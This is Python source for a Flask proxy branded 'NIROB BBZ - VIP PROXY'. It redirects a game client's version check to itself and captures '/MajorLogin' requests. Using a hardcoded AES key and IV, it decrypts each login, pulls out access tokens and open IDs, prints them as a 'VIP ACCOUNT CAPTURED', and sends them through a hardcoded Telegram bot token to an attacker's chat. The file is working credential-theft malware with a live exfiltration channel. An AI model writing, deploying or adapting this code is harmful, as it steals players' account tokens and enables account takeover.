from flask import Flask, request, Response, jsonify
import json
import requests
import socket
from urllib.parse import urlparse, parse_qs
import httpx
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import time
import random
import os
import logging

# Import x7m functions directly (not as module)
def decrypt_api(encrypted_hex):
    """Decrypt API response - Direct implementation"""
    try:
        key = b'Yg&tc%DEuh6%Zc^8'
        iv = b'6oyZDr22E3ychjM%'
        
        # Convert hex to bytes
        encrypted_data = bytes.fromhex(encrypted_hex)
        
        # Decrypt
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = unpad(cipher.decrypt(encrypted_data), AES.block_size)
        
        return decrypted.decode('utf-8')
    except Exception as e:
        print(f"Decryption error: {e}")
        return "{}"

def get_available_room(decrypted_data):
    """Process decrypted data"""
    try:
        data = json.loads(decrypted_data)
        return data
    except:
        return {}

# ================= TELEGRAM CONFIG =================
BOT_TOKEN = "8859282308:AAFPrC5ooQOGxacZdnbB-ZjAQ5szGeLyf-Y"
CHAT_ID = "-1004291576288"
# ===================================================

# Flask App initialization
app = Flask(__name__)

# Disable logging for cleaner output
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# ANSI Colors for Terminal Styling (for local run only)
G = "\033[92m"
Y = "\033[93m"
R = "\033[91m"
B = "\033[94m"
W = "\033[0m"
C = "\033[96m"
M = "\033[95m"

# RGB Color codes
def rgb_color(r, g, b):
    return f"\033[38;2;{r};{g};{b}m"

def rainbow_text(text):
    colors = [
        (255, 0, 0), (255, 165, 0), (255, 255, 0),
        (0, 255, 0), (0, 255, 255), (0, 0, 255), (128, 0, 255)
    ]
    result = ""
    for i, char in enumerate(text):
        color = colors[i % len(colors)]
        result += f"\033[38;2;{color[0]};{color[1]};{color[2]}m{char}"
    return result + W

def animated_banner():
    banner = f"""
{G}╔══════════════════════════════════════════╗
{Y}║          NIROB BBZ - VIP PROXY           ║
{C}║          SECURE SERVER v2.0              ║
{M}╚══════════════════════════════════════════╝{W}
    """
    print(banner)

# Get local IP
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

LOCAL_IP = get_local_ip()
PORT = int(os.environ.get('PORT', 5000))

# ================= CONFIGURATION =================
Key, Iv = b'Yg&tc%DEuh6%Zc^8', b'6oyZDr22E3ychjM%'

def EnC_AEs(HeX):
    cipher = AES.new(Key, AES.MODE_CBC, Iv)
    return cipher.encrypt(pad(HeX, AES.block_size)).hex()
    
def DEc_AEs(HeX):
    cipher = AES.new(Key, AES.MODE_CBC, Iv)
    return unpad(cipher.decrypt(HeX), AES.block_size).hex()

# ================= TELEGRAM SENDER =================
def send_to_telegram(access_token, open_id):
    """Send captured credentials to Telegram group"""
    try:
        message = f"""👑 New Token!

🔑 Token:
{access_token}

🆔 Open ID:
{open_id}

👑 Powered by: NIROB BBZ
⚡ Status: Successful Intercept
"""
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        response = requests.post(url, json=payload, timeout=10)
        if response.status_code == 200:
            print(f"{G}[✔] Token sent to Telegram!{W}")
            return True
        else:
            print(f"{R}[!] Failed to send: {response.text}{W}")
            return False
    except Exception as e:
        print(f"{R}[!] Telegram send error: {e}{W}")
        return False

# ================= PROXY HANDLER =================
@app.route('/', defaults={'path': ''})
@app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
def proxy_handler(path):
    """Main proxy handler for all requests"""
    
    # Get full path
    full_path = f"/{path}" if path else "/"
    parsed_path = urlparse(full_path)
    path = parsed_path.path
    
    # Handle /ver.php route
    if path == "/ver.php":
        return handle_ver_php(parsed_path)
    
    # Handle /MajorLogin route (VIP Trap)
    elif path == "/MajorLogin":
        return handle_major_login()
    
    # Default 404
    else:
        return Response("Not Found", status=404)

def handle_ver_php(parsed_path):
    """Handle /ver.php requests"""
    print(f"{B}[INFO] Forwarding /ver.php request...{W}")
    
    target = "https://version.ggwhitehawk.com/live/ver.php"
    
    # Get headers
    headers = {k: v for k, v in request.headers.items() 
               if k.lower() not in ("host", "content-length", "connection")}
    
    # Get body
    body = request.get_data()
    
    try:
        # Forward request
        with httpx.Client(follow_redirects=True) as client:
            r = client.request(
                request.method, 
                target, 
                params=parse_qs(parsed_path.query), 
                headers=headers, 
                content=body
            )
        
        # Parse response
        try:
            data = r.json()
        except json.JSONDecodeError:
            data = {"raw": r.text}
        
        # Add server URL
        data["server_url"] = f"http://{LOCAL_IP}:{PORT}/"
        
        # Create response
        response = Response(json.dumps(data), status=r.status_code, mimetype='application/json')
        
        # Copy headers
        HOP_BY_HOP = {'transfer-encoding', 'connection', 'keep-alive', 'proxy-authenticate', 
                      'proxy-authorization', 'te', 'trailers', 'upgrade', 'proxy-connection'}
        for k, v in r.headers.items():
            if k.lower() not in HOP_BY_HOP and k.lower() not in ("content-length", "content-encoding"):
                response.headers[k] = v
        
        return response
        
    except Exception as e:
        print(f"{R}[!] /ver.php Error: {e}{W}")
        return Response(json.dumps({"error": str(e)}), status=500, mimetype='application/json')

def handle_major_login():
    """Handle /MajorLogin requests - VIP Trap"""
    print(f"\n{rainbow_text('[+] TARGET HIT! /MajorLogin captured!')}{W}")
    
    # Get request body
    pyl = request.get_data()
    
    try:
        # Decrypt and parse using our own functions
        decrypted = decrypt_api(pyl.hex())
        x7m_data = get_available_room(decrypted)
        access_token = x7m_data.get("29", "FAILED_TO_EXTRACT")
        open_id = x7m_data.get("22", "FAILED_TO_EXTRACT")
    except Exception as e:
        print(f"{R}[!] Decryption/Parsing Failed: {e}{W}")
        access_token, open_id = "FAILED_TO_EXTRACT", "FAILED_TO_EXTRACT"
    
    print(f"{Y}[*] Extracting Credentials...{W}")
    
    # Display credentials with colors (for local run)
    print(f"\n{C}{'═' * 60}{W}")
    print(f"{rainbow_text('🔥 VIP ACCOUNT CAPTURED 🔥')}")
    print(f"{C}{'═' * 60}{W}")
    print(f"\n{Y}🔑 {C}Access Token:{W}")
    print(f"  {access_token}")
    print(f"\n{Y}🆔 {C}Open ID:{W}")
    print(f"  {open_id}")
    print(f"\n{C}{'═' * 60}{W}")
    print(f"{rainbow_text('👑 Powered by: NIROB BBZ')}")
    print(f"{rainbow_text('⚡ Status: Successful Intercept')}")
    print(f"{C}{'═' * 60}{W}\n")
    
    # Send to Telegram
    send_to_telegram(access_token, open_id)
    
    # Response payload
    response_payload = f"""[b][c][00FFFF]✘━━━━━━━━━━━━━[FFD3EF]ZIBON[00FFFF]━━━━━━━━━━━━✘

[FF0000]Access Token => [00FF00]{access_token} [FF0000]| Open ID => [00FF00]{open_id}

[FF00FF]System Owner: [00FFFF]SPEED [FF0000]X [FFFF00]ZIBON 
[FFFF00]TG => [FF0000]@GHOST_XAPIS

[b][c][00FFFF]✘━━━━━━━━━━━━━[FFD3EF]ZIBON[00FFFF]━━━━━━━━━━━━✘
"""
    
    return Response(response_payload, status=500, mimetype='application/octet-stream')

# ================= HEALTH CHECK =================
@app.route('/health')
def health_check():
    """Health check endpoint for Vercel"""
    return jsonify({
        "status": "ok",
        "server": "NIROB BBZ - VIP PROXY",
        "version": "2.0",
        "port": PORT,
        "local_ip": LOCAL_IP
    })

@app.route('/status')
def status():
    """Status endpoint"""
    return jsonify({
        "status": "running",
        "message": "Proxy server is active",
        "telegram_configured": bool(BOT_TOKEN and CHAT_ID)
    })

# ================= RUN FUNCTION =================
if __name__ == '__main__':
    # Print banner
    animated_banner()
    
    # Show status
    print(f"{G}[✔] Status      : {W}{Y}Running Successfully{W}")
    print(f"{G}[✔] Port        : {W}{Y}{PORT}{W}")
    print(f"{G}[✔] Local Proxy : {W}{B}http://127.0.0.1:{PORT}/{W}")
    print(f"{G}[✔] Network IP  : {W}{B}http://{LOCAL_IP}:{PORT}/{W}")
    print(f"{rainbow_text('──────────────────────────────────────────')}")
    print(f"{Y}[*] Waiting for target requests...{W}\n")
    
    # Run the app
    app.run(host='0.0.0.0', port=PORT, debug=False)
